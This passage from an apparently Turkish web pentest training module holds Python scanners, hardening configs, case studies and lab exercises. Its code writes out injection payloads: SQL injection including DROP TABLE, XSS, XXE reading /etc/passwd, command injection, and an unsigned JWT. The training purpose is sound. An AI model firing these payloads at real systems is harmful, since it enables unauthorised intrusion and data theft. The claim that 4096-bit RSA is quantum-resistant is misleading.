        """Parse Swagger/OpenAPI documentation"""
        try:
            if 'paths' in doc:
                for path, methods in doc['paths'].items():
                    full_path = f"{self.api_base_url}{path}"
                    self.endpoints.append(full_path)
        except Exception as e:
            pass
    
    def test_authentication_bypass(self):
        """Test for authentication bypass vulnerabilities"""
        auth_bypass_tests = [
            # JWT manipulation
            {
                'name': 'JWT None Algorithm',
                'headers': {'Authorization': 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.'}
            },
            # SQL injection in auth
            {
                'name': 'SQL Injection in Auth',
                'data': {'username': "admin' OR '1'='1' --", 'password': 'password'}
            },
            # Default credentials
            {
                'name': 'Default Credentials',
                'data': {'username': 'admin', 'password': 'admin'}
            }
        ]
        
        for endpoint in self.endpoints:
            for test in auth_bypass_tests:
                try:
                    if 'headers' in test:
                        response = self.session.get(endpoint, headers=test['headers'])
                    elif 'data' in test:
                        response = self.session.post(f"{endpoint}/login", json=test['data'])
                    
                    if response.status_code == 200 and 'token' in response.text.lower():
                        self.vulnerabilities.append({
                            'type': 'Authentication Bypass',
                            'endpoint': endpoint,
                            'test': test['name'],
                            'severity': 'Critical'
                        })
                
                except Exception as e:
                    continue
    
    def test_authorization_flaws(self):
        """Test for authorization vulnerabilities"""
        # Test for IDOR (Insecure Direct Object References)
        idor_endpoints = [
            '/api/users/1',
            '/api/users/2',
            '/api/orders/1',
            '/api/orders/2',
            '/api/documents/1',
            '/api/documents/2'
        ]
        
        for endpoint_template in idor_endpoints:
            try:
                # Test with different IDs
                for user_id in [1, 2, 999, -1, 'admin']:
                    endpoint = f"{self.api_base_url}{endpoint_template.replace('1', str(user_id))}"
                    response = self.session.get(endpoint)
                    
                    if response.status_code == 200:
                        # Check if sensitive data is exposed
                        sensitive_fields = ['password', 'ssn', 'credit_card', 'token']
                        if any(field in response.text.lower() for field in sensitive_fields):
                            self.vulnerabilities.append({
                                'type': 'Insecure Direct Object Reference',
                                'endpoint': endpoint,
                                'severity': 'High'
                            })
            
            except Exception as e:
                continue
    
    def test_input_validation(self):
        """Test for input validation vulnerabilities"""
        injection_payloads = {
            'sql': ["'; DROP TABLE users; --", "' OR '1'='1"],
            'nosql': ['{"$ne": null}', '{"$gt": ""}'],
            'xss': ['<script>alert("XSS")</script>', '"><script>alert(1)</script>'],
            'xxe': ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'],
            'command': ['; ls -la', '| whoami', '& dir']
        }
        
        for endpoint in self.endpoints:
            for injection_type, payloads in injection_payloads.items():
                for payload in payloads:
                    try:
                        # Test in JSON body
                        test_data = {'input': payload, 'search': payload, 'query': payload}
                        response = self.session.post(endpoint, json=test_data)
                        
                        # Check for injection indicators
                        if injection_type == 'sql' and any(error in response.text.lower() for error in ['sql', 'mysql', 'postgresql']):
                            self.vulnerabilities.append({
                                'type': 'SQL Injection',
                                'endpoint': endpoint,
                                'payload': payload,
                                'severity': 'Critical'
                            })
                        
                        elif injection_type == 'xss' and payload in response.text:
                            self.vulnerabilities.append({
                                'type': 'Cross-Site Scripting',
                                'endpoint': endpoint,
                                'payload': payload,
                                'severity': 'High'
                            })
                    
                    except Exception as e:
                        continue
    
    def test_rate_limiting(self):
        """Test for rate limiting vulnerabilities"""
        for endpoint in self.endpoints:
            try:
                # Send multiple requests quickly
                responses = []
                for i in range(100):
                    response = self.session.get(endpoint)
                    responses.append(response.status_code)
                
                # Check if all requests succeeded (no rate limiting)
                if all(status == 200 for status in responses):
                    self.vulnerabilities.append({
                        'type': 'Missing Rate Limiting',
                        'endpoint': endpoint,
                        'severity': 'Medium'
                    })
            
            except Exception as e:
                continue
    
    def test_data_exposure(self):
        """Test for sensitive data exposure"""
        for endpoint in self.endpoints:
            try:
                response = self.session.get(endpoint)
                
                if response.status_code == 200:
                    # Check for sensitive data patterns
                    sensitive_patterns = {
                        'Credit Card': r'\b(?:\d{4}[-\s]?){3}\d{4}\b',
                        'SSN': r'\b\d{3}-\d{2}-\d{4}\b',
                        'Email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
                        'API Key': r'[A-Za-z0-9]{32,}',
                        'Password Hash': r'\$2[aby]\$\d+\$[./A-Za-z0-9]{53}'
                    }
                    
                    import re
                    for data_type, pattern in sensitive_patterns.items():
                        if re.search(pattern, response.text):
                            self.vulnerabilities.append({
                                'type': 'Sensitive Data Exposure',
                                'endpoint': endpoint,
                                'data_type': data_type,
                                'severity': 'High'
                            })
            
            except Exception as e:
                continue
    
    def run_comprehensive_test(self):
        """Run all API security tests"""
        print("Starting API security assessment...")
        
        # Discover endpoints
        self.discover_endpoints()
        print(f"Discovered {len(self.endpoints)} endpoints")
        
        # Run tests
        self.test_authentication_bypass()
        print("âœ“ Authentication bypass tests completed")
        
        self.test_authorization_flaws()
        print("âœ“ Authorization tests completed")
        
        self.test_input_validation()
        print("âœ“ Input validation tests completed")
        
        self.test_rate_limiting()
        print("âœ“ Rate limiting tests completed")
        
        self.test_data_exposure()
        print("âœ“ Data exposure tests completed")
        
        return self.generate_report()
    
    def generate_report(self):
        """Generate API security assessment report"""
        severity_counts = {
            'Critical': len([v for v in self.vulnerabilities if v.get('severity') == 'Critical']),
            'High': len([v for v in self.vulnerabilities if v.get('severity') == 'High']),
            'Medium': len([v for v in self.vulnerabilities if v.get('severity') == 'Medium']),
            'Low': len([v for v in self.vulnerabilities if v.get('severity') == 'Low'])
        }
        
        report = {
            'target': self.api_base_url,
            'test_date': datetime.now().isoformat(),
            'endpoints_tested': len(self.endpoints),
            'total_vulnerabilities': len(self.vulnerabilities),
            'severity_breakdown': severity_counts,
            'vulnerabilities': self.vulnerabilities,
            'endpoints': self.endpoints
        }
        
        return report

# Usage example
if __name__ == "__main__":
    api_tester = APISecurityTester("http://localhost:8080/api")
    report = api_tester.run_comprehensive_test()
    
    # Save report
    with open(f"api_security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json", 'w') as f:
        json.dump(report, f, indent=2)
    
    print(f"\nAPI security assessment completed.")
    print(f"Total vulnerabilities found: {report['total_vulnerabilities']}")
    for severity, count in report['severity_breakdown'].items():
        if count > 0:
            print(f"{severity}: {count}")
```

## ğŸ› ï¸ Ã–nerilen AraÃ§lar

### ğŸ”§ Ticari AraÃ§lar

#### Burp Suite Professional
- **Ã–zellikler**: KapsamlÄ± web uygulama gÃ¼venlik testi
- **Avantajlar**: GeliÅŸmiÅŸ scanner, intruder, repeater
- **KullanÄ±m AlanlarÄ±**: Manuel ve otomatik testing
- **Lisans**: Ticari (yÄ±llÄ±k abonelik)

#### Nessus Professional
- **Ã–zellikler**: Vulnerability assessment ve compliance
- **Avantajlar**: GeniÅŸ vulnerability database
- **KullanÄ±m AlanlarÄ±**: Network ve web app scanning
- **Lisans**: Ticari

#### Acunetix
- **Ã–zellikler**: Otomatik web vulnerability scanner
- **Avantajlar**: HÄ±zlÄ± tarama, dÃ¼ÅŸÃ¼k false positive
- **KullanÄ±m AlanlarÄ±**: CI/CD entegrasyonu
- **Lisans**: Ticari

### ğŸ†“ AÃ§Ä±k Kaynak AraÃ§lar

#### OWASP ZAP (Zed Attack Proxy)
- **Ã–zellikler**: Ãœcretsiz web app security scanner
- **Avantajlar**: Aktif geliÅŸtirme, plugin desteÄŸi
- **KullanÄ±m AlanlarÄ±**: Penetration testing, security regression
- **Lisans**: Apache 2.0

#### Nikto
- **Ã–zellikler**: Web server scanner
- **Avantajlar**: HÄ±zlÄ±, komut satÄ±rÄ± tabanlÄ±
- **KullanÄ±m AlanlarÄ±**: Initial reconnaissance
- **Lisans**: GPL

#### SQLMap
- **Ã–zellikler**: SQL injection detection ve exploitation
- **Avantajlar**: Ã‡ok geliÅŸmiÅŸ SQL injection testi
- **KullanÄ±m AlanlarÄ±**: Database security assessment
- **Lisans**: GPL

### ğŸ”§ Custom Tool Development

```python
# Web Application Security Scanner Framework
import asyncio
import aiohttp
import re
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import json
from datetime import datetime

class AsyncWebScanner:
    def __init__(self, target_url, max_concurrent=10):
        self.target_url = target_url
        self.max_concurrent = max_concurrent
        self.session = None
        self.vulnerabilities = []
        self.scanned_urls = set()
    
    async def __aenter__(self):
        connector = aiohttp.TCPConnector(limit=self.max_concurrent)
        self.session = aiohttp.ClientSession(connector=connector)
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def scan_url(self, url, payloads):
        """Scan a single URL with given payloads"""
        if url in self.scanned_urls:
            return
        
        self.scanned_urls.add(url)
        
        try:
            async with self.session.get(url, timeout=10) as response:
                content = await response.text()
                
                # Test for XSS
                for payload in payloads['xss']:
                    if payload in content:
                        self.vulnerabilities.append({
                            'type': 'XSS',
                            'url': url,
                            'payload': payload,
                            'severity': 'High'
                        })
        
        except Exception as e:
            pass
    
    async def run_scan(self):
        """Run comprehensive async scan"""
        payloads = {
            'xss': ['<script>alert("XSS")</script>', '"><script>alert(1)</script>'],
            'sqli': ["' OR '1'='1", "'; DROP TABLE users; --"]
        }
        
        # Discover URLs to scan
        urls_to_scan = await self.discover_urls()
        
        # Create scanning tasks
        tasks = []
        for url in urls_to_scan:
            task = asyncio.create_task(self.scan_url(url, payloads))
            tasks.append(task)
        
        # Execute all tasks concurrently
        await asyncio.gather(*tasks, return_exceptions=True)
        
        return self.vulnerabilities
    
    async def discover_urls(self):
        """Discover URLs to scan"""
        urls = [self.target_url]
        
        try:
            async with self.session.get(self.target_url) as response:
                content = await response.text()
                soup = BeautifulSoup(content, 'html.parser')
                
                # Extract links
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    full_url = urljoin(self.target_url, href)
                    if urlparse(full_url).netloc == urlparse(self.target_url).netloc:
                        urls.append(full_url)
        
        except Exception as e:
            pass
        
        return list(set(urls))

# Usage example
async def main():
    async with AsyncWebScanner("http://localhost:8080") as scanner:
        vulnerabilities = await scanner.run_scan()
        print(f"Found {len(vulnerabilities)} vulnerabilities")

# Run with: asyncio.run(main())
```

## ğŸ“‹ YapÄ±landÄ±rma En Ä°yi UygulamalarÄ±

### ğŸ”’ GÃ¼venli Web Uygulama KonfigÃ¼rasyonu

```nginx
# Nginx gÃ¼venlik konfigÃ¼rasyonu
server {
    listen 443 ssl http2;
    server_name example.com;
    
    # SSL Configuration
    ssl_certificate /path/to/certificate.crt;
    ssl_certificate_key /path/to/private.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512;
    ssl_prefer_server_ciphers off;
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 10m;
    
    # Security Headers
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "no-referrer-when-downgrade" always;
    add_header Content-Security-Policy "default-src 'self' http: https: data: blob: 'unsafe-inline'" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    
    # Hide server information
    server_tokens off;
    
    # Rate limiting
    limit_req_zone $binary_remote_addr zone=login:10m rate=1r/s;
    limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
    
    location /login {
        limit_req zone=login burst=3 nodelay;
        proxy_pass http://backend;
    }
    
    location /api/ {
        limit_req zone=api burst=20 nodelay;
        proxy_pass http://backend;
    }
    
    # Block common attack patterns
    location ~* \.(php|asp|aspx|jsp)$ {
        return 444;
    }
    
    # Prevent access to sensitive files
    location ~ /\. {
        deny all;
        return 404;
    }
}
```

### ğŸ›¡ï¸ Web Application Firewall (WAF) KurallarÄ±

```apache
# ModSecurity kurallarÄ±
SecRuleEngine On
SecRequestBodyAccess On
SecResponseBodyAccess On

# SQL Injection korumasÄ±
SecRule ARGS "@detectSQLi" \
    "id:1001,\
    phase:2,\
    block,\
    msg:'SQL Injection Attack Detected',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}',\
    tag:'application-multi',\
    tag:'language-multi',\
    tag:'platform-multi',\
    tag:'attack-sqli'"

# XSS korumasÄ±
SecRule ARGS "@detectXSS" \
    "id:1002,\
    phase:2,\
    block,\
    msg:'XSS Attack Detected',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}',\
    tag:'application-multi',\
    tag:'language-multi',\
    tag:'platform-multi',\
    tag:'attack-xss'"

# File upload korumasÄ±
SecRule FILES_TMPNAMES "@inspectFile /path/to/av-scanner.sh" \
    "id:1003,\
    phase:2,\
    block,\
    msg:'Malicious File Upload Detected'"

# Rate limiting
SecAction "id:1004,\
    phase:1,\
    nolog,\
    pass,\
    initcol:ip=%{REMOTE_ADDR},\
    setvar:ip.requests_per_minute=+1,\
    expirevar:ip.requests_per_minute=60"

SecRule IP:REQUESTS_PER_MINUTE "@gt 60" \
    "id:1005,\
    phase:1,\
    block,\
    msg:'Rate limit exceeded'"
```

## ğŸ¯ GerÃ§ek DÃ¼nya Vaka Ã‡alÄ±ÅŸmalarÄ±

### Vaka 1: E-ticaret Platformu SQL Injection

**Senaryo**: BÃ¼yÃ¼k bir e-ticaret sitesinde Ã¼rÃ¼n arama fonksiyonunda SQL injection aÃ§Ä±ÄŸÄ±

**KeÅŸif SÃ¼reci**:
```python
# Vulnerable endpoint discovery
import requests

def test_ecommerce_sqli():
    base_url = "https://shop.example.com"
    
    # Test search functionality
    payloads = [
        "' OR '1'='1",
        "'; SELECT * FROM users; --",
        "' UNION SELECT username,password FROM admin_users --"
    ]
    
    for payload in payloads:
        response = requests.get(
            f"{base_url}/search",
            params={'q': payload}
        )
        
        if "mysql" in response.text.lower() or "error" in response.text.lower():
            print(f"Potential SQL injection with payload: {payload}")
            return True
    
    return False
```

**Impact Analizi**:
- MÃ¼ÅŸteri verilerinin Ã§alÄ±nmasÄ± riski
- Ã–deme bilgilerinin ele geÃ§irilmesi
- Admin hesaplarÄ±na yetkisiz eriÅŸim
- Marka itibarÄ±nÄ±n zarar gÃ¶rmesi

**Ã‡Ã¶zÃ¼m Ã–nerileri**:
```python
# GÃ¼venli implementation
import sqlite3
from contextlib import contextmanager

class SecureProductSearch:
    def __init__(self, db_path):
        self.db_path = db_path
    
    @contextmanager
    def get_connection(self):
        conn = sqlite3.connect(self.db_path)
        try:
            yield conn
        finally:
            conn.close()
    
    def search_products(self, search_term, category=None, price_min=None, price_max=None):
        # Input validation
        if not search_term or len(search_term) > 100:
            return []
        
        # Sanitize input
        search_term = search_term.strip()
        
        with self.get_connection() as conn:
            cursor = conn.cursor()
            
            query = "SELECT id, name, price, description FROM products WHERE name LIKE ?"
            params = [f"%{search_term}%"]
            
            if category:
                query += " AND category = ?"
                params.append(category)
            
            if price_min is not None:
                query += " AND price >= ?"
                params.append(price_min)
            
            if price_max is not None:
                query += " AND price <= ?"
                params.append(price_max)
            
            cursor.execute(query, params)
            return cursor.fetchall()
```

### Vaka 2: SaaS Platformu Broken Access Control

**Senaryo**: Multi-tenant SaaS uygulamasÄ±nda kullanÄ±cÄ±lar baÅŸka organizasyonlarÄ±n verilerine eriÅŸebiliyor

**Test Metodolojisi**:
```python
# IDOR (Insecure Direct Object Reference) testi
def test_idor_vulnerability():
    session = requests.Session()
    
    # Login as user from organization A
    login_data = {'email': 'user@companyA.com', 'password': 'password123'}
    session.post('https://saas.example.com/login', json=login_data)
    
    # Try to access organization B's data
    org_b_endpoints = [
        '/api/organizations/2/users',
        '/api/organizations/2/documents',
        '/api/organizations/2/settings'
    ]
    
    for endpoint in org_b_endpoints:
        response = session.get(f"https://saas.example.com{endpoint}")
        if response.status_code == 200:
            print(f"IDOR vulnerability found at: {endpoint}")
            return True
    
    return False
```

**GÃ¼venli Ã‡Ã¶zÃ¼m**:
```python
# Secure multi-tenant access control
from functools import wraps
from flask import session, request, abort

def require_organization_access(org_param='org_id'):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            # Get user's organization from session
            user_org_id = session.get('organization_id')
            
            # Get requested organization from URL/params
            requested_org_id = kwargs.get(org_param) or request.args.get(org_param)
            
            # Check if user belongs to requested organization
            if str(user_org_id) != str(requested_org_id):
                abort(403)  # Forbidden
            
            return f(*args, **kwargs)
        return decorated_function
    return decorator

# Usage
@app.route('/api/organizations/<int:org_id>/users')
@require_organization_access('org_id')
def get_organization_users(org_id):
    return get_users_by_organization(org_id)
```

## âœ… DeÄŸerlendirme ve DoÄŸrulama

### ğŸ“ Bilgi Kontrol SorularÄ±

1. **OWASP Top 10 2021**
   - A01:2021 Broken Access Control'Ã¼n ana nedenleri nelerdir?
   - SQL Injection saldÄ±rÄ±larÄ±nÄ± nasÄ±l Ã¶nlersiniz?
   - XSS saldÄ±rÄ±larÄ±nÄ±n farklÄ± tÃ¼rleri nelerdir?

2. **Penetrasyon Testi Metodolojisi**
   - PTES (Penetration Testing Execution Standard) aÅŸamalarÄ± nelerdir?
   - Manuel test ile otomatik test arasÄ±ndaki farklar nelerdir?
   - False positive'leri nasÄ±l minimize edersiniz?

3. **GÃ¼venlik AraÃ§larÄ±**
   - Burp Suite'in temel modÃ¼lleri nelerdir?
   - OWASP ZAP ile Burp Suite arasÄ±ndaki farklar nelerdir?
   - SQLMap'in geliÅŸmiÅŸ Ã¶zelliklerini aÃ§Ä±klayÄ±n.

### ğŸ› ï¸ Pratik Ã–devler

#### Ã–dev 1: KapsamlÄ± Web App Pentest
**Hedef**: DVWA (Damn Vulnerable Web Application)
**GÃ¶revler**:
1. TÃ¼m OWASP Top 10 zafiyetlerini test edin
2. Manuel ve otomatik test sonuÃ§larÄ±nÄ± karÅŸÄ±laÅŸtÄ±rÄ±n
3. DetaylÄ± penetrasyon testi raporu hazÄ±rlayÄ±n
4. Remediation Ã¶nerilerini Ã¶ncelik sÄ±rasÄ±na gÃ¶re listeleyin

#### Ã–dev 2: API Security Assessment
**Hedef**: OWASP Juice Shop API
**GÃ¶revler**:
1. API endpoint'lerini keÅŸfedin
2. Authentication ve authorization aÃ§Ä±klarÄ±nÄ± test edin
3. Input validation zafiyetlerini belirleyin
4. Rate limiting kontrollerini deÄŸerlendirin

#### Ã–dev 3: Custom Scanner Development
**GÃ¶rev**: Python ile Ã¶zel web vulnerability scanner geliÅŸtirin
**Ã–zellikler**:
- Async scanning capability
- Multiple vulnerability types
- Detailed reporting
- False positive reduction

### ğŸ“Š Performans Metrikleri

```python
# Web pentest performance metrics
class PentestMetrics:
    def __init__(self):
        self.metrics = {
            'scan_duration': 0,
            'urls_scanned': 0,
            'vulnerabilities_found': 0,
            'false_positives': 0,
            'critical_issues': 0,
            'high_issues': 0,
            'medium_issues': 0,
            'low_issues': 0
        }
    
    def calculate_efficiency_score(self):
        if self.metrics['urls_scanned'] == 0:
            return 0
        
        # Efficiency = (True positives / Total findings) * Coverage
        true_positives = (self.metrics['vulnerabilities_found'] - 
                         self.metrics['false_positives'])
        
        if self.metrics['vulnerabilities_found'] == 0:
            accuracy = 1.0
        else:
            accuracy = true_positives / self.metrics['vulnerabilities_found']
        
        coverage = min(self.metrics['urls_scanned'] / 100, 1.0)  # Normalize to 100 URLs
        
        return (accuracy * 0.7) + (coverage * 0.3)
    
    def generate_performance_report(self):
        efficiency = self.calculate_efficiency_score()
        
        return {
            'efficiency_score': efficiency,
            'scan_speed': self.metrics['urls_scanned'] / max(self.metrics['scan_duration'], 1),
            'vulnerability_density': self.metrics['vulnerabilities_found'] / max(self.metrics['urls_scanned'], 1),
            'critical_ratio': self.metrics['critical_issues'] / max(self.metrics['vulnerabilities_found'], 1)
        }
```

## ğŸš€ Ä°leri Konular

### ğŸ¤– AI-Powered Web Application Testing

```python
# Machine learning based vulnerability detection
import numpy as np
from sklearn.ensemble import RandomForestClassifier
from sklearn.feature_extraction.text import TfidfVectorizer
import joblib

class AIVulnerabilityDetector:
    def __init__(self):
        self.model = RandomForestClassifier(n_estimators=100)
        self.vectorizer = TfidfVectorizer(max_features=1000)
        self.is_trained = False
    
    def extract_features(self, http_response):
        """Extract features from HTTP response"""
        features = {
            'status_code': http_response.status_code,
            'content_length': len(http_response.text),
            'has_forms': 1 if '<form' in http_response.text else 0,
            'has_javascript': 1 if '<script' in http_response.text else 0,
            'has_sql_errors': 1 if any(error in http_response.text.lower() 
                                     for error in ['sql', 'mysql', 'postgresql']) else 0,
            'response_time': getattr(http_response, 'elapsed', 0).total_seconds()
        }
        
        # Text features
        text_features = self.vectorizer.transform([http_response.text]).toarray()[0]
        
        # Combine features
        all_features = list(features.values()) + list(text_features)
        return np.array(all_features)
    
    def train(self, training_data):
        """Train the model with labeled data"""
        features = []
        labels = []
        
        # Fit vectorizer on all text data
        all_texts = [item['response'].text for item in training_data]
        self.vectorizer.fit(all_texts)
        
        for item in training_data:
            feature_vector = self.extract_features(item['response'])
            features.append(feature_vector)
            labels.append(item['is_vulnerable'])
        
        self.model.fit(features, labels)
        self.is_trained = True
    
    def predict_vulnerability(self, http_response):
        """Predict if response indicates vulnerability"""
        if not self.is_trained:
            raise Exception("Model not trained yet")
        
        features = self.extract_features(http_response)
        probability = self.model.predict_proba([features])[0][1]
        
        return {
            'is_vulnerable': probability > 0.5,
            'confidence': probability,
            'risk_level': self.get_risk_level(probability)
        }
    
    def get_risk_level(self, probability):
        if probability > 0.8:
            return 'Critical'
        elif probability > 0.6:
            return 'High'
        elif probability > 0.4:
            return 'Medium'
        else:
            return 'Low'
    
    def save_model(self, filepath):
        """Save trained model"""
        joblib.dump({
            'model': self.model,
            'vectorizer': self.vectorizer,
            'is_trained': self.is_trained
        }, filepath)
    
    def load_model(self, filepath):
        """Load trained model"""
        data = joblib.load(filepath)
        self.model = data['model']
        self.vectorizer = data['vectorizer']
        self.is_trained = data['is_trained']
```

### ğŸ”® Quantum-Resistant Web Security

```python
# Post-quantum cryptography implementation
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import os

class QuantumResistantWebSecurity:
    def __init__(self):
        self.symmetric_key = os.urandom(32)  # 256-bit key
    
    def generate_post_quantum_keypair(self):
        """Generate quantum-resistant key pair"""
        # Using larger RSA keys as interim solution
        # In production, use NIST post-quantum algorithms
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=4096  # Larger key size for quantum resistance
        )
        public_key = private_key.public_key()
        
        return private_key, public_key
    
    def encrypt_session_data(self, data):
        """Encrypt session data with quantum-resistant algorithm"""
        # Use AES-256 with larger key sizes
        iv = os.urandom(16)
        cipher = Cipher(
            algorithms.AES(self.symmetric_key),
            modes.CBC(iv)
        )
        
        encryptor = cipher.encryptor()
        
        # Pad data to block size
        padded_data = self.pad_data(data.encode())
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
        
        return iv + encrypted_data
    
    def pad_data(self, data):
        """PKCS7 padding"""
        block_size = 16
        padding_length = block_size - (len(data) % block_size)
        padding = bytes([padding_length] * padding_length)
        return data + padding
    
    def implement_quantum_safe_tls(self):
        """Configure quantum-safe TLS settings"""
        return {
            'min_tls_version': 'TLSv1.3',
            'cipher_suites': [
                'TLS_AES_256_GCM_SHA384',
                'TLS_CHACHA20_POLY1305_SHA256'
            ],
            'key_exchange': 'ECDHE-RSA-4096',
            'signature_algorithm': 'RSA-PSS-SHA384',
            'certificate_key_size': 4096
        }
```

## ğŸ“š Kaynaklar ve Referanslar

### ğŸ“– Standartlar ve Metodolojiler
- **OWASP Testing Guide v4.2**: Comprehensive web application testing methodology
- **PTES (Penetration Testing Execution Standard)**: Industry standard for penetration testing
- **NIST SP 800-115**: Technical Guide to Information Security Testing and Assessment
- **OWASP ASVS**: Application Security Verification Standard

### ğŸ“ Sertifikasyonlar
- **OSCP (Offensive Security Certified Professional)**
- **GWEB (GIAC Web Application Penetration Tester)**
- **CEH (Certified Ethical Hacker)**
- **CISSP (Certified Information Systems Security Professional)**

### ğŸ“š Ã–nerilen Kitaplar
1. "The Web Application Hacker's Handbook" - Dafydd Stuttard, Marcus Pinto
2. "Real-World Bug Hunting" - Peter Yaworski
3. "Web Security Testing Cookbook" - Paco Hope, Ben Walther
4. "The Tangled Web" - Michal Zalewski

### ğŸŒ Online Kaynaklar
- **PortSwigger Web Security Academy**: https://portswigger.net/web-security
- **OWASP WebGoat**: https://owasp.org/www-project-webgoat/
- **HackerOne Hacktivity**: https://hackerone.com/hacktivity
- **Bugcrowd University**: https://www.bugcrowd.com/hackers/bugcrowd-university/

### ğŸ› ï¸ Pratik Laboratuvarlar
- **DVWA (Damn Vulnerable Web Application)**
- **OWASP Juice Shop**
- **Mutillidae II**
- **bWAPP (Buggy Web Application)**
- **WebGoat**

---

*Bu modÃ¼l, web uygulama penetrasyon testinin temel ve ileri seviye konularÄ±nÄ± kapsamaktadÄ±r. Pratik egzersizler ve gerÃ§ek dÃ¼nya senaryolarÄ± ile desteklenen iÃ§erik, profesyonel web uygulama gÃ¼venlik testi becerilerinin geliÅŸtirilmesini hedeflemektedir.*